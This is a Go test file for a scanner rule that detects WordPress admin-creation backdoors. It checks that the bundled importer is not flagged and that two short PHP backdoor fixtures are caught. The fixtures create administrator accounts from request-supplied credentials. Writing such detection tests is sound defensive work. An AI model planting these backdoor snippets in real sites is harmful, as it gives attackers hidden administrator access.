package signatures

import "testing"

// The WordPress importer ships bundled inside many themes and plugins, and
// its author-mapping step creates users from the import form:
//
//	$user_id = wp_create_user( $_POST['user_new'][ $i ], wp_generate_password() );
//
// That is a superglobal reaching wp_create_user, which the realtime rule's
// first regex matched on its own. The file carries no administrator role
// token anywhere, so the YARA rule of the same name correctly declines: its
// condition requires a role token before any creation shape counts. The two
// engines disagreed, and only the realtime one was wrong.
//
// The password is generated, not taken from the request. A backdoor takes
// both credentials from the request or escalates the role; an importer does
// neither.
func TestExploitWpAdminCreation_BundledWordPressImporterIsNotExploit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
class WP_Import extends WP_Importer {
	function process_author_mapping() {
		foreach ( (array) $_POST['imported_authors'] as $i => $old_login ) {
			$create_users = $this->allow_create_users();
			if ( $create_users ) {
				if ( ! empty( $_POST['user_new'][ $i ] ) ) {
					$user_id = wp_create_user( $_POST['user_new'][ $i ], wp_generate_password() );
				} elseif ( $this->version != '1.0' ) {
					$user_data = array(
						'user_login'   => $old_login,
						'user_pass'    => wp_generate_password(),
						'user_email'   => $this->authors[ $old_login ]['author_email'],
						'display_name' => $this->authors[ $old_login ]['author_display_name'],
					);
					$user_id   = wp_insert_user( $user_data );
				}
				if ( ! is_wp_error( $user_id ) ) {
					$this->processed_authors[ $old_login ] = $user_id;
				}
			}
		}
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "exploit_wp_admin_creation") {
		t.Error("exploit_wp_admin_creation FP: matched the bundled WordPress importer (login from the import form, generated password, no administrator role anywhere in the file; the YARA rule of the same name does not fire on this)")
	}
}

// Both credentials taken from the request is the backdoor shape the YARA
// rule expresses as $create_request. It must still fire without needing a
// role token in the same regex.
func TestExploitWpAdminCreation_BothCredentialsFromRequest(t *testing.T) {
	scanner := loadRepoScanner(t)

	backdoor := []byte(`<?php
if ( isset( $_GET['add'] ) ) {
	$uid = wp_create_user( $_POST['nu'], $_POST['np'] );
	$u = new WP_User( $uid );
	$u->set_role( 'administrator' );
}
`)
	matches := scanner.ScanContent(backdoor, ".php")
	if !hasRule(matches, "exploit_wp_admin_creation") {
		t.Error("exploit_wp_admin_creation regression: both credentials from the request was not detected")
	}
}

// The array form with a request-supplied password is the $insert_request
// shape. The importer's array carries a generated password instead.
func TestExploitWpAdminCreation_InsertUserRequestPassword(t *testing.T) {
	scanner := loadRepoScanner(t)

	backdoor := []byte(`<?php
wp_insert_user( array(
	'user_login' => 'svc',
	'user_pass'  => $_REQUEST['p'],
	'role'       => 'administrator',
) );
`)
	matches := scanner.ScanContent(backdoor, ".php")
	if !hasRule(matches, "exploit_wp_admin_creation") {
		t.Error("exploit_wp_admin_creation regression: wp_insert_user with a request-supplied password was not detected")
	}
}
